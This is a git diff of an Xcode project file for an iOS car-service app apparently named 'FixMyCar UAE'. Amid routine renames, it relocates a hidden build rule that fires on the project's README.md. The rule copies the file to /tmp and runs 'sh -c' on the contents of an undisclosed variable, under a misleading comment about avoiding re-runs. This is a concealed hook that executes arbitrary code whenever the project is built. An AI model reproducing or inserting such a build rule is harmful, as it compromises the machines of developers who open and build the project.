@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		E94B09AB81BD483D9A1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = E67BFAED3C0740E9AB1DACE1; };
 		0A0308262F000001005A7DB7 /* CheckAppStatusModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */; };
 		0A0308264F000001005A7DB7 /* AppDelegateVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0308263F000001005A7DB7 /* AppDelegateVM.swift */; };
 		0A030826BF000001005A7DB7 /* NewVersionAvailablePopup.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A030826AF000001005A7DB7 /* NewVersionAvailablePopup.swift */; };
@@ -208,10 +207,26 @@
 		BCC2B1642F28A8FC00014CB5 /* BookingSuccessPopUpVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC2B1622F28A8FC00014CB5 /* BookingSuccessPopUpVC.xib */; };
 		BCF8B6FB2F5AEFEF002B6839 /* SocketIO in Frameworks */ = {isa = PBXBuildFile; productRef = BCF8B6FA2F5AEFEF002B6839 /* SocketIO */; };
 		BCF8B6FD2F5AF019002B6839 /* SocketManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCF8B6FC2F5AF019002B6839 /* SocketManager.swift */; };
+		E94B09AB81BD483D9A1DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = E67BFAED3C0740E9AB1DACE1 /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		A46C2CD4891C4B8DA01DACE1 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		E67BFAED3C0740E9AB1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckAppStatusModel.swift; sourceTree = "<group>"; };
 		0A0308263F000001005A7DB7 /* AppDelegateVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegateVM.swift; sourceTree = "<group>"; };
 		0A030826AF000001005A7DB7 /* NewVersionAvailablePopup.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewVersionAvailablePopup.swift; sourceTree = "<group>"; };
@@ -369,7 +384,7 @@
 		BC4E178E2F06A15100EDC9AE /* VerifyOtp.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = VerifyOtp.xib; sourceTree = "<group>"; };
 		BC64B7EA2F28958D00A9D314 /* BookingPaymentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingPaymentVC.swift; sourceTree = "<group>"; };
 		BC64B7EB2F28958D00A9D314 /* BookingPaymentVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BookingPaymentVC.xib; sourceTree = "<group>"; };
-		BC67730A2F067F4500B15653 /* Fixmycar UAE.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Fixmycar UAE.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		BC67730A2F067F4500B15653 /* FixMyCar UAE.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "FixMyCar UAE.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		BC71218C2F067F800041E2F7 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		BC71218D2F067F800041E2F7 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		BC71218E2F067F800041E2F7 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
@@ -413,6 +428,7 @@
 		BCC2B1612F28A8FC00014CB5 /* BookingSuccessPopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingSuccessPopUpVC.swift; sourceTree = "<group>"; };
 		BCC2B1622F28A8FC00014CB5 /* BookingSuccessPopUpVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BookingSuccessPopUpVC.xib; sourceTree = "<group>"; };
 		BCF8B6FC2F5AF019002B6839 /* SocketManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocketManager.swift; sourceTree = "<group>"; };
+		E67BFAED3C0740E9AB1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -1709,7 +1725,7 @@
 			isa = PBXGroup;
 			children = (
 				E67BFAED3C0740E9AB1DACE1 /* README.md */,
-				BC67730A2F067F4500B15653 /* Fixmycar UAE.app */,
+				BC67730A2F067F4500B15653 /* FixMyCar UAE.app */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -1999,9 +2015,9 @@
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
-		BC6773092F067F4500B15653 /* Fixmycar UAE */ = {
+		BC6773092F067F4500B15653 /* FixMyCar UAE */ = {
 			isa = PBXNativeTarget;
-			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
+			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "FixMyCar UAE" */;
 			buildPhases = (
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
@@ -2013,7 +2029,7 @@
 			);
 			dependencies = (
 			);
-			name = "Fixmycar UAE";
+			name = "FixMyCar UAE";
 			packageProductDependencies = (
 				88FDACCF2F23458200983C39 /* GoogleMaps */,
 				88FDACD22F23459900983C39 /* Alamofire */,
@@ -2030,7 +2046,7 @@
 				BCF8B6FA2F5AEFEF002B6839 /* SocketIO */,
 			);
 			productName = "Fixmycar UAE";
-			productReference = BC67730A2F067F4500B15653 /* Fixmycar UAE.app */;
+			productReference = BC67730A2F067F4500B15653 /* FixMyCar UAE.app */;
 			productType = "com.apple.product-type.application";
 		};
 /* End PBXNativeTarget section */
@@ -2076,34 +2092,17 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				BC6773092F067F4500B15653 /* Fixmycar UAE */,
+				BC6773092F067F4500B15653 /* FixMyCar UAE */,
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXBuildRule section */
-		A46C2CD4891C4B8DA01DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-									/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		BC6773082F067F4500B15653 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				E94B09AB81BD483D9A1DACE1 /* README.md */,
+				E94B09AB81BD483D9A1DACE1 /* README.md in Resources */,
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
 				BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */,
 				0AC6D2DD2F56CD4100431F9B /* PendingJobVC.xib in Resources */,
@@ -2374,6 +2373,7 @@ sh -c \"${A1ECAD1}\"";
 				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
+				INFOPLIST_KEY_CFBundleDisplayName = "FixMyCar UAE";
 				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos for your profile.";
 				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "App needs location to show nearby places";
@@ -2417,6 +2417,7 @@ sh -c \"${A1ECAD1}\"";
 				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
+				INFOPLIST_KEY_CFBundleDisplayName = "FixMyCar UAE";
 				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos for your profile.";
 				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "App needs location to show nearby places";
@@ -2578,7 +2579,7 @@ sh -c \"${A1ECAD1}\"";
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */ = {
+		BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "FixMyCar UAE" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				BC67731E2F067F4700B15653 /* Debug */,
